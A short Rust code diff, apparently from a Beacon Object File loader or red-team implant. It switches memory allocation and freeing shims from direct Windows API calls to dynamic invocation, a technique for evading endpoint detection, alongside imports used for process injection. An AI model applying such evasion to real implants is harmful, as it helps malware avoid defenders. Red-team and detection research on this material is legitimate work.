@@ -19,7 +19,7 @@ use windows::Win32::{
         Diagnostics::Debug::{CONTEXT, GetThreadContext, SetThreadContext},
         Memory::{
             MEM_COMMIT, MEM_RESERVE, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READWRITE,
-            UnmapViewOfFile, VirtualAlloc, VirtualFree, VirtualQuery,
+            UnmapViewOfFile, VirtualQuery,
         },
         Threading::{
             CREATE_NO_WINDOW, CREATE_SUSPENDED, CreateProcessA, GetCurrentProcess, OpenThread,
@@ -1017,7 +1017,7 @@ fn beacon_virtual_alloc(
 ) -> *mut c_void {
     use windows::Win32::System::Memory::{PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE};
     unsafe {
-        VirtualAlloc(
+        dinvoke::kernel32::VirtualAlloc(
             Some(address),
             size,
             VIRTUAL_ALLOCATION_TYPE(alloc_type),
@@ -1102,7 +1102,7 @@ fn beacon_virtual_protect_ex(
 fn beacon_virtual_free(address: *mut c_void, size: usize, free_type: u32) -> i32 {
     use windows::Win32::System::Memory::VIRTUAL_FREE_TYPE;
     unsafe {
-        if VirtualFree(address, size, VIRTUAL_FREE_TYPE(free_type)).is_ok() {
+        if dinvoke::kernel32::VirtualFree(address, size, VIRTUAL_FREE_TYPE(free_type)).is_ok() {
             1
         } else {
             0
